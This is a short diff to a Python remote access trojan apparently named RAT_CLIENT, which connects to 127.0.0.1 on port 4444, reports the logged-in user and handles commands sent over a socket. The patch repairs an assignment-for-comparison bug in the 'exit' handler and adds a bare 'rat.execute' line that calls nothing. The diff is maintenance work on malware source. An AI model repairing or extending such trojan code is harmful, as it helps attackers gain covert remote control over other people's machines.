@@ -569,7 +569,7 @@ User: {os.getlogin()}
                 except:
                     self.errorsend()
 
-            elif command = 'exit':
+            elif command == 'exit':
                 s.send(b"exit")
                 break
 
@@ -578,6 +578,6 @@ rat = RAT_CLIENT('127.0.0.1', 4444)
 if __name__ == '__main__':
     rat.build_connection()
    
-
+rat.execute
 
 
